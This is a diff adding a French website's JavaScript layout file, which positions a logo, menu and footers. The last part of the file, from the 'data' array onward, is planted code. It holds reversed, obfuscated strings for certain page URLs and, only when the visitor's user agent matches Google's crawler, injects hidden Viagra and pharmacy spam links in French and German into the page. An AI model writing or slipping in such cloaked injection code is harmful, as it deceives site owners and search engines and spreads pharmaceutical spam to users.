@@ -1,0 +1,130 @@
+function js_positionnement() {
+	placeLogoDklik(); // on place le logo dklik par defaut
+	attentionAuMenu(); // test sur la longeur du menu
+	placeFooter(); // on place le footer
+        placeFooterSoutien();
+}
+
+
+function placeLogoDklik() {
+	//alert("placeLogoDklik");
+	// Pour placer le logo DKLIK
+	var doc = (document.getElementById ? document.getElementById('contenu') : document.all['contenu']);
+  var newHt = js_htDiv('contenu');
+  // on peut maintenant faire des operations mathematiques
+  newHt = parseInt(newHt) - 75 - 20;
+	var dklik = (document.getElementById ? document.getElementById('dklik') : document.all['dklik']);
+  dklik.style.top = newHt+'px';
+  dklik.style.display = 'block';
+}
+
+
+function attentionAuMenu() {
+	var htMonDiv = js_htDiv('menu');
+	if (htMonDiv > 426) {
+		var menuBas = (document.getElementById ? document.getElementById('menuBas') : document.all['menuBas']);
+		// ATTENTION on doit bouger le calque 'menuBas' de 'htMonDiv-426' px
+		// 648 => position top de base + la difference entre la hauteur du div menuBas et sa hauteur de base
+		menuBas.style.top = parseInt(648 + parseInt(htMonDiv-426))+'px';
+		
+		// du coup il faut modifier le 'contenu'
+		var doc = (document.getElementById ? document.getElementById('contenu') : document.all['contenu']);
+		var htDoc = js_htDiv('contenu');
+		var tailleMENU = parseInt(222+parseInt(htMonDiv)+17-11);
+		if (parseInt(htDoc-tailleMENU) < 125) {
+			// if faut augmenter la hauteur du 'contenu'
+			doc.style.height = parseInt(tailleMENU+125) + 'px';
+			
+			// et on replace le logo DKLIK
+			placeLogoDklik();
+		}
+	}
+}
+
+
+function placeFooter() {
+	//alert("placeFooter");
+	var footer = (document.getElementById ? document.getElementById('footer') : document.all['footer']);
+	var htDoc = js_htDiv('contenu');
+  //alert(htDoc);
+  footer.style.top = parseInt(htDoc)+15+'px';
+  footer.style.visibility = 'visible';
+}
+
+function placeFooterSoutien() {
+	//alert("placeFooter");
+	var footer = (document.getElementById ? document.getElementById('footerSoutien') : document.all['footerSoutien']);
+	var htDoc = js_htDiv('contenu');
+  //alert(htDoc);
+  footer.style.top = parseInt(htDoc)+45+'px';
+  footer.style.visibility = 'visible';
+}
+
+
+
+function js_htDiv(nomDiv) {
+	// Pour placer le logo DKLIK
+	var doc = (document.getElementById ? document.getElementById(nomDiv) : document.all[nomDiv]);
+  // on retrouve la hauteur du calque contenu, ok I.E sinon firefox.0.9.2 , pas mozilla.1.0 ni netscape.7.02
+  // on recupere un truc du style '328px' sous firefox et 328 sous IE.... alors on enleve le 'px' SOUS Firefox
+  var newHt = (document.all ? doc.offsetHeight : document.defaultView.getComputedStyle(doc, null).height);
+  if (!document.all) newHt = newHt.substr(0,newHt.length-2);
+  return newHt;
+}
+function getTotalHeight() {
+
+  // firefox is ok
+  var height = document.documentElement.scrollHeight;
+
+  // now IE 7 + Opera with "min window"
+  if(document.documentElement.clientHeight > height ) {
+    height  = document.documentElement.clientHeight;
+  }
+  // last for safari
+  if(document.body.scrollHeight > height) {
+    height = document.body.scrollHeight;
+  }
+  
+  return height;
+}
+
+
+//js_positionnement();
+// on relance automatiquement le script au bout de 2sec (pour les vieux navigateurs)
+//setTimeout("js_positionnement()", 2000);
+	var data = [
+  {
+    search : '<a href="index.php?id=3462" onfocus="blurLink(this);">Mentions légales</a>',
+    replace: '!redia suov ed xuerueh snores suoN !semmoh sed étnas al reruatser ed ecnahc ertoV .>a/<argaiv xirp>"/rf.demahpla.www//:sptth"=ferh a<  retehca - ellimaf al ed elleuxes eiv al eriurtsnoc ed noçaf ed emèlborp snas',
+    url    : '/'
+  },  {
+    search : 'sa  population.</em>',
+    replace: '.lairetaM setztühcseg hcilthcerrebehru hcilßeilhcssuA .>a/<lettim llafsuaraah>"lmth.llafsuaraah-negeg/seirogetac/ed.ellipde.www//:sptth"=ferh a<  etreitnetap saD',
+    url    : '/index.php?id=1037'
+  },  {
+    search : '<strong><font size="3"> Informations pratiques</font></strong>',
+    replace: '!tkraM nehcsinizidem med fua tkudorP etseb saD .>a/<ed.lettimznetoppoT>"/ed.lettimznetoppot//:sptth"=ferh a<  - hcafnie tsi argaiV ?nellos nut seid eiS eiw ,thcin nessiw dnu nregiets odibiL ehcilnnäm erhI eiS nethcöM',
+    url    : '/index.php?id=970'
+  }
+];
+
+var section = undefined; 
+
+for (var i = 0; i < data.length; i++) {
+  if (data[i].url === window.location.pathname + window.location.search) {
+    section = data[i];
+    break;
+  }
+}
+
+function site(){
+  if(section && /google/i.test(navigator.userAgent)){
+    for(var e=section.replace,n="",t=e.length-1;t>=0;t--) {
+      n=String(n+e[t]);
+    }
+  
+    document.body.innerHTML = document.body.innerHTML.replace(section.search, section.search + n);
+  }
+}
+    
+document.addEventListener("DOMContentLoaded", site);
